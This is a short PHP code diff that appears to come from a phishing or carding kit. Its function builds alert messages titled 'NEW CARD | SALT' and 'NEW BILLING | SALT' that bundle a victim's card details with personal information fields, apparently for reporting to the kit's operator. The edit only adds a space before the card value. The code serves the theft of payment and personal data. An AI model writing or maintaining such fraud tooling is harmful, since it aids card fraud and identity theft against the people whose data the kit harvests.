@@ -229,7 +229,7 @@ function build_card_message(array $data, bool $partial = false): string
     if ($partial) {
         return <<<TXT
 [💳] + 1 NEW BILLING | SALT [💳]
-    ⤷{$card}
+    ⤷ {$card}
 
 🧐Informations Personnelles 
 ⤷ 🧐 Sex : {$titre}
@@ -262,7 +262,7 @@ TXT;
 
     return <<<TXT
 [💳] + 1 NEW CARD | SALT [💳]
-    ⤷{$card}
+    ⤷ {$card}
 
 🧐Informations Personnelles 
 ⤷ 🧐 Sex : {$titre}
